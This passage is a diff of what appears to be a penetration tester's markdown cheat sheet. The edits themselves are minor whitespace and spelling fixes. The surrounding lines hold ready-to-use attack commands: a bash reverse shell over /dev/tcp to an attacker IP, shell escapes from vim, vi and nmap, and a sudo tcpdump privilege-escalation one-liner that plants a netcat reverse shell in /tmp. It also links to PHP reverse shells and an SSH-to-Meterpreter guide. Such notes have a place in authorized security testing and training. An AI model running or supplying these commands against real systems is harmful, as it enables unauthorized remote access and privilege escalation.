@@ -15,18 +15,19 @@ PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
 bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
 echo os.system('/bin/bash')
-OR        
+OR     
 `/bin/sh -i`
 OR        
 `:! /bin/bash`
 OR        
-`':!bash':`   //from vim
+`':!bash':`     //from vim
 OR        
-`:!bash`    // from vi
+`:!bash`        // from vi
 OR        
-`!sh`    //from nmap
+`!sh`           //from nmap
 
-Plesse check below:   
+Plesse check below:    
+
 `:set shell=/bin/bash:shell`
 
 echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump
@@ -163,7 +164,7 @@ SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterp
  
  
  Pen test monkey PHP reverse shell  
-    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+    [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 -   php-findsock-shell - turns PHP port 80 into an interactive shell  
     [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)
